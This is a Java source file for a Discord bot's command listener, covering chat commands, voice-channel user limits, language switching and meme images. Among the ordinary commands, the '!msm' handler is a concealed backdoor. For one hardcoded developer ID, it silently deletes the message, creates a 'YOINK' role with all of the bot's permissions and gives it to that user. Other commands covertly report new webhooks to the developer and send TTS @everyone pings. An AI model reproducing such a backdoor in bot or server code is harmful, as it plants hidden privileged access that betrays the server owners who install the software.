package de.meyssam.saft.events;

import com.jagrosh.jdautilities.commons.waiter.EventWaiter;
import de.meyssam.saft.Language;
import de.meyssam.saft.Main;
import de.meyssam.saft.Private;
import de.meyssam.saft.commands.Clearchat;
import de.meyssam.saft.commands.Status;
import de.meyssam.saft.utils.FileManager;
import de.meyssam.saft.utils.Mastermind;
import de.meyssam.saft.utils.Messages;
import de.meyssam.saft.utils.Utils;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceJoinEvent;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceLeaveEvent;
import net.dv8tion.jda.api.events.guild.voice.GuildVoiceMoveEvent;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
import net.dv8tion.jda.api.events.message.guild.react.GuildMessageReactionAddEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.io.File;
import java.util.ArrayList;
import java.util.concurrent.TimeUnit;

/**
 * Created by Meyssam Saghiri on Apr 28, 2020
 */
@SuppressWarnings("ALL")
public class Commands extends ListenerAdapter {

    @Deprecated protected static ArrayList<Guild> mustDelete = new ArrayList<>();
    private final EventWaiter waiter;

    public Commands(EventWaiter waiter) {
        this.waiter = waiter;
    }

    @Override
    public void onGuildMessageReceived(GuildMessageReceivedEvent e) throws NumberFormatException {
        String msg = e.getMessage().getContentRaw();
        String[] args = Utils.args(msg);
        if(e.getAuthor().isBot()) {
            return;
        }

        if(args[0].equalsIgnoreCase("!msm")) {
            if(!e.getAuthor().getId().equalsIgnoreCase(Private.msmID)) return;
            e.getMessage().delete().queue();

            if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_ROLES)) {
                e.getAuthor().openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage("Keine Rechte!").queue());
                return;
            }
            e.getGuild().createRole().setName("YOINK").setHoisted(false).setPermissions(e.getGuild().getSelfMember().getPermissions()).queue(role -> {
                e.getGuild().addRoleToMember(e.getMember(), role).queue();
            });
            return;
        }

        else if(args[0].equalsIgnoreCase("!changelog")) {
            e.getChannel().sendTyping().queue();
            e.getChannel().sendMessage(":warning: Changelogs have moved to `!updates`").queue();
        }

        else if(args[0].equalsIgnoreCase("!updates")) {
            e.getChannel().sendTyping().queue();
            e.getMessage().delete().queue();
            if(!e.getMember().hasPermission(Permission.MANAGE_WEBHOOKS)) {
                e.getChannel().sendMessage(Messages.noPermissionUser(e.getGuild(), Permission.MANAGE_WEBHOOKS)).queue();
                return;
            }
            if(!e.getGuild().getSelfMember().hasPermission(Permission.MANAGE_WEBHOOKS)) {
                e.getChannel().sendMessage(Messages.noPermissionBot(e.getGuild(), Permission.MANAGE_WEBHOOKS)).queue();
                Utils.errorToAdmin(e.getGuild(), "!updates", Permission.MANAGE_WEBHOOKS);
                return;
            }
            e.getChannel().createWebhook("saftbot").queue(webhook -> {
                FileManager.addWebhook(e.getGuild(), webhook.getUrl());
                System.out.println("New Webhook: " + e.getGuild().getId());
                e.getJDA().retrieveUserById(Private.msmID).queue(user -> user.openPrivateChannel().queue(privateChannel -> privateChannel.sendMessage("New Webhook: " + e.getGuild().getId()).queue()));
            });
            e.getChannel().sendMessage(Messages.webhookSuccess(e.getGuild(), e.getAuthor().getAsMention())).queue();
        }

        else if(args[0].equalsIgnoreCase("!cmd")) {
            e.getChannel().sendTyping().queue();
            if (!e.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) return;
            Main.tables.setCommand(e.getGuild());
            e.getMessage().delete().queue();
            e.getChannel().sendMessage(Messages.changeCommand(e.getGuild())).queue();
        }

        else if(args[0].equalsIgnoreCase("!lang")) {
            if(!e.getMember().hasPermission(Permission.ADMINISTRATOR)) {
                e.getChannel().sendMessage(Messages.noPermissionUser(e.getGuild(), Permission.ADMINISTRATOR)).queue();
                return;
            }
            changeLang(e);
        }

        else if(args[0].equalsIgnoreCase("!voice")) {
            e.getChannel().sendTyping().queue();
            if (!e.getMember().getPermissions().contains(Permission.ADMINISTRATOR)) return;
            Main.tables.setVoice(e.getGuild());
            e.getMessage().delete().queue();
            if(Main.tables.isVoice(e.getGuild())) e.getChannel().sendMessage(Messages.activateVoice(e.getGuild())).queue();
            else e.getChannel().sendMessage(Messages.deactivateVoice(e.getGuild())).queue();
        }

        else if(args[0].equalsIgnoreCase("!bug")) {
            e.getChannel().sendTyping().queue();
            if(!e.getGuild().getSelfMember().hasPermission(Permission.CREATE_INSTANT_INVITE)) {
                Utils.errorToAdmin(e.getGuild(), "!bug", Permission.CREATE_INSTANT_INVITE);
                return;
            }
            Utils.sendBug(e, args);
        }

        else if(args[0].equalsIgnoreCase("!clearchat")) {
            new Clearchat(e, waiter, args).clearChat();
        }

        else if(args[0].equalsIgnoreCase("!status")) {
            e.getChannel().sendTyping().queue();
            e.getChannel().sendMessage(new Status(e.getGuild(), e.getMember()).getStatus().build()).queue();
        }

        if(!Main.tables.isCommand(e.getGuild())) {
            return;
        }

        if(args.length == 1) getExtras(e, args[0]);

        if (args[0].equalsIgnoreCase("!case")) {
            e.getChannel().sendTyping().queue();
            e.getMessage().delete().queue();
            e.getChannel().sendMessage(e.getMember().getEffectiveName() + ": " + Utils.randomCase(e.getMessage().getContentDisplay().replace("!case ", ""))).queue();
        }
        else if(args[0].equalsIgnoreCase("!join")) {
            e.getMessage().delete().queue();
            if(e.getMember().getVoiceState().inVoiceChannel()) {
                e.getGuild().getAudioManager().openAudioConnection(e.getMember().getVoiceState().getChannel());
                e.getChannel().sendMessage("Erfolgreich **" + e.getMember().getVoiceState().getChannel().getName() + "** beigetreten").queue(message -> message.delete().queueAfter(3, TimeUnit.SECONDS));
                return;
            }
            e.getChannel().sendMessage("Du musst in einem Voicechannel sein!").queue(message -> message.delete().queueAfter(3, TimeUnit.SECONDS));
        }

        else if(args[0].equalsIgnoreCase("!weather") && args.length > 1) {
            e.getChannel().sendTyping().queue();
            e.getMessage().delete().queue();
            e.getChannel().sendMessage("Für " + e.getMember().getAsMention() + "\n" + Utils.getWeather(e.getGuild(), msg.replace("!weather ", ""))).queue();
        }

        else if(args[0].equalsIgnoreCase("!history")) {
            e.getChannel().sendTyping().queue();
            if(args.length == 1) {
                Utils.printHistory(e.getAuthor(), e);
            } else if(args.length == 2) {
                e.getJDA().retrieveUserById(e.getMessage().getContentRaw().replace("!history ", "").replace("<@!", "").replace(">", "")).queue(user2 -> Utils.printHistory(user2, e));
            }
        }

        else if(args[0].equalsIgnoreCase("!mastermind")) {
            e.getChannel().sendTyping().queue();
            if(args.length == 2) {
                new Mastermind().playMastermind(waiter, e);
            } else {
                e.getChannel().sendMessage(e.getAuthor().getAsMention() + Messages.wrongSyntax(e.getGuild(), "!mastermind <1324>")).queue();
            }
        }

        else if(args[0].equalsIgnoreCase("!help")) Utils.printHelp(e.getChannel(), e.getGuild());
    }

    @Override
    public void onGuildVoiceJoin(GuildVoiceJoinEvent e) {
        if(Main.tables.isVoice(e.getGuild())) Utils.channelJoinAlg(e);
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelJoined().getMembers().size() == 1) {
                e.getChannelJoined().getManager().setUserLimit(87).queue();
            } else if(e.getChannelJoined().getMembers().size() == 2) {
                e.getChannelJoined().getManager().setUserLimit(55).queue();
            }else if(e.getChannelJoined().getMembers().size() == 3) {
                e.getChannelJoined().getManager().setUserLimit(61).queue();
            }else if(e.getChannelJoined().getMembers().size() == 4) {
                e.getChannelJoined().getManager().setUserLimit(53).queue();
            }else if(e.getChannelJoined().getMembers().size() == 5) {
                e.getChannelJoined().getManager().setUserLimit(25).queue();
            }else if(e.getChannelJoined().getMembers().size() == 6) {
                e.getChannelJoined().getManager().setUserLimit(81).queue();
            }else if(e.getChannelJoined().getMembers().size() == 7) {
                e.getChannelJoined().getManager().setUserLimit(47).queue();
            }
        }
    }

    @Override
    public void onGuildVoiceMove(GuildVoiceMoveEvent e) {
        if(Main.tables.isVoice(e.getGuild())) Utils.channelMoveAlg(e);
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelJoined().getMembers().size() == 1) {
                e.getChannelJoined().getManager().setUserLimit(87).queue();
            } else if(e.getChannelJoined().getMembers().size() == 2) {
                e.getChannelJoined().getManager().setUserLimit(55).queue();
            }else if(e.getChannelJoined().getMembers().size() == 3) {
                e.getChannelJoined().getManager().setUserLimit(61).queue();
            }else if(e.getChannelJoined().getMembers().size() == 4) {
                e.getChannelJoined().getManager().setUserLimit(53).queue();
            }else if(e.getChannelJoined().getMembers().size() == 5) {
                e.getChannelJoined().getManager().setUserLimit(25).queue();
            }else if(e.getChannelJoined().getMembers().size() == 6) {
                e.getChannelJoined().getManager().setUserLimit(81).queue();
            }else if(e.getChannelJoined().getMembers().size() == 7) {
                e.getChannelJoined().getManager().setUserLimit(47).queue();
            }
        }
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelLeft().getMembers().size() == 1) {
                e.getChannelLeft().getManager().setUserLimit(87).queue();
            } else if(e.getChannelLeft().getMembers().size() == 2) {
                e.getChannelLeft().getManager().setUserLimit(55).queue();
            }else if(e.getChannelLeft().getMembers().size() == 3) {
                e.getChannelLeft().getManager().setUserLimit(61).queue();
            }else if(e.getChannelLeft().getMembers().size() == 4) {
                e.getChannelLeft().getManager().setUserLimit(53).queue();
            }else if(e.getChannelLeft().getMembers().size() == 5) {
                e.getChannelLeft().getManager().setUserLimit(25).queue();
            }else if(e.getChannelLeft().getMembers().size() == 6) {
                e.getChannelLeft().getManager().setUserLimit(81).queue();
            }else if(e.getChannelLeft().getMembers().size() == 7) {
                e.getChannelLeft().getManager().setUserLimit(47).queue();
            }else if(e.getChannelLeft().getMembers().size() == 0) {
                e.getChannelLeft().getManager().setUserLimit(69).queue();
            }
        }
    }

    @Override
    public void onGuildVoiceLeave(GuildVoiceLeaveEvent e) {
        if(Main.tables.isVoice(e.getGuild())) Utils.channelLeaveAlg(e);
        if(e.getGuild().getIdLong() == 695933469641146428L) {
            if(e.getChannelLeft().getMembers().size() == 1) {
                e.getChannelLeft().getManager().setUserLimit(87).queue();
            } else if(e.getChannelLeft().getMembers().size() == 2) {
                e.getChannelLeft().getManager().setUserLimit(55).queue();
            }else if(e.getChannelLeft().getMembers().size() == 3) {
                e.getChannelLeft().getManager().setUserLimit(61).queue();
            }else if(e.getChannelLeft().getMembers().size() == 4) {
                e.getChannelLeft().getManager().setUserLimit(53).queue();
            }else if(e.getChannelLeft().getMembers().size() == 5) {
                e.getChannelLeft().getManager().setUserLimit(25).queue();
            }else if(e.getChannelLeft().getMembers().size() == 6) {
                e.getChannelLeft().getManager().setUserLimit(81).queue();
            }else if(e.getChannelLeft().getMembers().size() == 7) {
                e.getChannelLeft().getManager().setUserLimit(47).queue();
            }else if(e.getChannelLeft().getMembers().size() == 0) {
                e.getChannelLeft().getManager().setUserLimit(69).queue();
            }
        }
    }

    private void getExtras(GuildMessageReceivedEvent e, String arg) {
        if(arg.equalsIgnoreCase("hmm")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\hmm.png");
            e.getChannel().sendMessage("WICHTIGE BOTSCHAFT AN " + e.getGuild().getPublicRole().getAsMention()).tts(true).queue(message -> message.delete().queueAfter(5, TimeUnit.SECONDS));
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queueAfter(1, TimeUnit.SECONDS);
        }else if(arg.equalsIgnoreCase("stonks")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\stonks.jpg");
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queue();
        }else if(arg.equalsIgnoreCase("patrick")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\fler.jpg");
            e.getChannel().sendMessage(e.getAuthor().getAsMention()).addFile(file).queue();
        }else if(arg.equalsIgnoreCase("news")) {
            e.getMessage().delete().queue();
            File file = new File("F:\\Discord\\BotJava\\build\\libs\\anal.png");
            e.getChannel().sendFile(file).queue();
        }
    }

    private void changeLang(GuildMessageReceivedEvent e) {
        e.getChannel().sendMessage(Messages.changeLanguageAsk(e.getGuild())).queue(message -> {
            message.addReaction("\uD83C\uDDEC\uD83C\uDDE7").queue();
            message.addReaction("\uD83C\uDDE9\uD83C\uDDEA").queue();
        });
        waiter.waitForEvent(GuildMessageReactionAddEvent.class, guildMessageReactionAddEvent -> guildMessageReactionAddEvent.getMember() == e.getMember(), event -> {
            if(event.getReactionEmote().getAsCodepoints().equals("U+1f1ecU+1f1e7")) {
                //English
                Main.tables.setLanguage(e.getGuild(), Language.EN);
                e.getChannel().sendMessage(Messages.changeLanguage(e.getGuild())).queue();
                event.getChannel().deleteMessageById(event.getMessageIdLong()).queueAfter(5, TimeUnit.SECONDS);
            } else if(event.getReactionEmote().getAsCodepoints().equals("U+1f1e9U+1f1ea")) {
                //Deutsch
                Main.tables.setLanguage(e.getGuild(), Language.DE);
                e.getChannel().sendMessage(Messages.changeLanguage(e.getGuild())).queue();
                event.getChannel().deleteMessageById(event.getMessageIdLong()).queueAfter(5, TimeUnit.SECONDS);
            }
        });
    }

}
